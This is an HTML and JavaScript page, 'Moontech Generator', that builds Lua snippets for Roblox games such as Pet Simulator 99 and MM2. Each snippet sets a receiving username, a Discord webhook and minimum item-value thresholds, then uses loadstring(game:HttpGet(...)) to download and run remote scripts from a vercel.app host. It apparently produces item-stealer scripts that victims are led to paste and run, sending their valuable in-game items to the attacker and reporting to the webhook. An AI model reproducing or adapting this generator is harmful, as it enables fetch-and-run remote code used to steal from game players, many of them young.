<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="icon" href="https://media.discordapp.net/attachments/1279110366797758478/1286666241238630452/simple-circle-moon-wolf-head-vector-animal-logo-template-nature-wildlife-icon-design-inspiration-simple-circle-moon-164937967_1.webp?ex=670131d1&is=66ffe051&hm=d1118a8dcfdab040ca27ddecfb00c31474dcecded3d63804227d86cabb988ea6&=&format=webp" type="image/png"> <!-- Replace with your icon link -->
  <title>Moontech</title>
  <style>
    body {
        font-family: 'Roboto', sans-serif;
        background: linear-gradient(135deg, #6e8efb, #a777e3);
        color: #333;
        text-align: center;
        margin: 0;
        padding: 0;
    }
    .container {
        max-width: 800px;
        margin: 50px auto;
        padding: 30px;
        background: #ffffff;
        border-radius: 12px;
        box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
    }
    h1 {
        color: #333;
        font-size: 2.5em;
        margin-bottom: 20px;
    }
    .embed {
        background: #f8f9fa;
        border: 1px solid #ccc;
        border-radius: 8px;
        padding: 15px;
        margin: 20px 0;
        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
    }
    .embed h2 {
        margin: 0 0 10px;
        font-size: 1.5em;
    }
    .embed a {
        color: #007bff;
        text-decoration: none;
    }
    .embed a:hover {
        text-decoration: underline;
    }
    form {
        margin: 0 auto;
        padding: 20px;
        background: #f8f9fa;
        border-radius: 8px;
        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
    }
    label {
        display: block;
        font-weight: bold;
        margin-bottom: 5px;
    }
    input, textarea, select {
        display: block;
        width: calc(100% - 22px);
        margin: 10px auto;
        padding: 12px;
        border: 1px solid #ccc;
        border-radius: 6px;
        font-size: 16px;
        background-color: #ffffff;
    }
    input:focus, textarea:focus, select:focus {
        border-color: #007bff;
        outline: none;
    }
    button {
        background-color: #007bff;
        color: white;
        border: none;
        padding: 12px 24px;
        font-size: 16px;
        border-radius: 6px;
        cursor: pointer;
        transition: background-color 0.3s ease, transform 0.2s ease;
    }
    button:hover {
        background-color: #0056b3;
        transform: scale(1.05);
    }
    button:active {
        background-color: #004494;
    }
    textarea {
        height: 150px;
        resize: vertical;
    }
    #status {
        margin-top: 20px;
        font-size: 16px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Moontech Generator</h1>
    
    <div class="embed">
      <h2>Webbased Generate Script</h2>
      <p>Moontech Invite: <a href="https://discord.gg/RsMKm4ZWGd" target="_blank">Join our Discord</a></p>
    </div>
    
    <form id="scriptForm">
      <label for="scriptType">Select Script Type:</label>
      <select id="scriptType" name="scriptType">
        <option value="ps99">PS99</option>
        <option value="psx">PSX</option>
        <option value="petsgo">PETSGO</option>
        <option value="mm2">MM2</option>
        <option value="adm">ADM</option>
      </select><br><br>

      <label for="username">Username:</label>
      <input type="text" id="username" name="username" required><br><br>

      <label for="username2" id="username2Label" style="display:none;">Username2 (For PS99, PSX):</label>
      <input type="text" id="username2" name="username2" style="display:none;"><br><br>

      <label for="webhook">Webhook (Required):</label>
      <input type="url" id="webhook" name="webhook" required><br><br>

      <label for="minRAP" id="minRAPLabel" style="display:none;">Minimum RAP (For PS99 and PETSGO):</label>
      <input type="number" id="minRAP" name="minRAP" style="display:none;"><br><br>

      <label for="minChance" id="minChanceLabel" style="display:none;">Minimum Chance (For PETSGO):</label>
      <input type="number" id="minChance" name="minChance" style="display:none;" min="0" required><br><br>

      <button type="button" id="generateBtn">Generate</button>
      <textarea id="output" readonly placeholder="Generated script will appear here"></textarea><br>

      <button type="button" id="copyBtn">Copy to Clipboard</button>
    </form>
  </div>

  <script>
document.addEventListener("DOMContentLoaded", function() {
  const scriptTypeDropdown = document.getElementById('scriptType');
  const username2Input = document.getElementById('username2');
  const username2Label = document.getElementById('username2Label');
  const minRAPInput = document.getElementById('minRAP');
  const minRAPLabel = document.getElementById('minRAPLabel');
  const minChanceInput = document.getElementById('minChance');
  const minChanceLabel = document.getElementById('minChanceLabel');
  const generateButton = document.getElementById('generateBtn');
  const copyButton = document.getElementById('copyBtn');
  const outputTextArea = document.getElementById('output');

  // Show/Hide additional fields based on script type selection
  scriptTypeDropdown.addEventListener('change', function() {
    const scriptType = scriptTypeDropdown.value;

    // Clear the output text area when changing dropdown
    outputTextArea.value = '';

    if (scriptType === 'ps99') {
      username2Input.style.display = 'block';
      username2Label.style.display = 'block';
      minRAPInput.style.display = 'block';
      minRAPLabel.style.display = 'block';
      minChanceInput.style.display = 'none'; // Hide for PS99
      minChanceLabel.style.display = 'none'; // Hide for PS99
    } else if (scriptType === 'psx') {
      username2Input.style.display = 'block';
      username2Label.style.display = 'block';
      minRAPInput.style.display = 'none';
      minRAPLabel.style.display = 'none';
      minChanceInput.style.display = 'none'; // Hide for PSX
      minChanceLabel.style.display = 'none'; // Hide for PSX
    } else if (scriptType === 'petsgo') {
      username2Input.style.display = 'none'; // Hide for PETSGO
      username2Label.style.display = 'none'; // Hide for PETSGO
      minRAPInput.style.display = 'block'; // Show for PETSGO
      minRAPLabel.style.display = 'block'; // Show for PETSGO
      minChanceInput.style.display = 'block'; // Show Minimum Chance
      minChanceLabel.style.display = 'block'; // Show Minimum Chance
    } else {
      username2Input.style.display = 'none';
      username2Label.style.display = 'none';
      minRAPInput.style.display = 'none';
      minRAPLabel.style.display = 'none';
      minChanceInput.style.display = 'none'; // Hide for other types
      minChanceLabel.style.display = 'none'; // Hide for other types
    }
  });

  // Generate script output based on selection
  generateButton.addEventListener('click', function(event) {
    event.preventDefault();

    const scriptType = scriptTypeDropdown.value;
    const username = document.getElementById("username").value;
    const webhook = document.getElementById("webhook").value;
    const minRAP = document.getElementById("minRAP").value;
    const minChance = document.getElementById("minChance").value;

    let outputString = '';

    switch (scriptType) {
      case "ps99":
        outputString = `Username = "${username}"\n` +
                       `Webhook = "${webhook}"\n` +
                       `MinimumRAP = ${minRAP}\n\n` +
                       `loadstring(game:HttpGet("https://moontech-scripts.vercel.app/petsim99.lua",true))()`;
        break;
      case "psx":
        outputString = `Username = "${username}"\n` +
                       `Webhook = "${webhook}"\n\n` +
                       `loadstring(game:HttpGet("https://moontech-scripts.vercel.app/petsimx.lua",true))()`;
        break;
      case "petsgo":
        outputString = `Username = "${username}"\n` +
                       `Webhook = "${webhook}"\n` +
                       `MinimumRAP = ${minRAP}\n` +
                       `MinimumCHANCE = ${minChance}\n\n` +
                       `loadstring(game:HttpGet("https://moontech-scripts.vercel.app/petsgo.lua",true))()`;
        break;
      case "mm2":
        outputString = `Username = "${username}"\n` +
                       `Webhook = "${webhook}"\n\n` +
                       `loadstring(game:HttpGet("https://moontech-scripts.vercel.app/mm2.lua",true))()`;
        break;
      case "adm":
        outputString = `Username = "${username}"\n` +
                       `Webhook = "${webhook}"\n\n` +
                       `loadstring(game:HttpGet("https://moontech-scripts.vercel.app/adm.lua",true))()`;
        break;
    }

    outputTextArea.value = outputString;
  });

  // Copy script to clipboard
  copyButton.addEventListener('click', function() {
    outputTextArea.select();
    document.execCommand('copy');
    alert('Script copied to clipboard!');
  });
});
  </script>
</body>
</html>
